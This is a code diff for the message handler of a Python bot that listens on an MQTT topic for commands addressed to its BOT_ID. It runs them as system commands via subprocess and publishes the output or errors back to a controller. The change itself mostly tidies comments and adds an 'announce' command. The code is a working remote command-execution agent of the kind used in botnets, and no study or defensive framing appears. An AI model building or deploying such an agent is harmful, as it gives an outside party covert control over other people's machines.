@@ -18,25 +18,23 @@ from consts import *
 def on_message(client, userdata, msg):
     payload = msg.payload.decode()
     if payload.startswith(BOT_ID + ":"):
-        full_command = payload.split(":", 1)[1] # e.g., "ls /home"
-
-        # Split into command and arguments
+        full_command = payload.split(":", 1)[1]
         parts = full_command.split(" ", 1)
         action = parts[0] # e.g., "ls"
-        argument = parts[1] if len(parts) > 1 else "" # e.g., "/home"
-
+        argument = parts[1] if len(parts) > 1 else ""
         print(f"Action: {action} | Argument: {argument}")
-
-        result = ""
         try :
-            if action == "ls":
+            if action == CMD_ANNOUNCE_BOT:
+                result = f"Bot {BOT_ID} is online."
+            elif action == CMD_LIST_FILES:
                 # If argument is empty, just use ['ls'], otherwise ['ls', argument]
                 cmd_list = ["ls", argument] if argument else ["ls"]
                 # capture_output would be modern, but check_output is fine
-                # we add stderr=subprocess.STDOUT so we see errors in the controller
+                # add stderr=subprocess.STDOUT so we see errors in the controller
                 result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
             else:
-                # For other commands, execute them directly and IGNORE blank "" args
+                # execute other commands directly
+                # ignore blank "" args
                 cmd_list = [action] + ([argument] if argument else [])
                 result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
 
@@ -46,9 +44,6 @@ def on_message(client, userdata, msg):
         except Exception as e:
             error_message = str(e)
             client.publish(TOPIC, f"{BOT_ID}_ERR: {error_message}")
-
-
-
     else:
         # It's someone else's traffic. Ignore it.
         pass
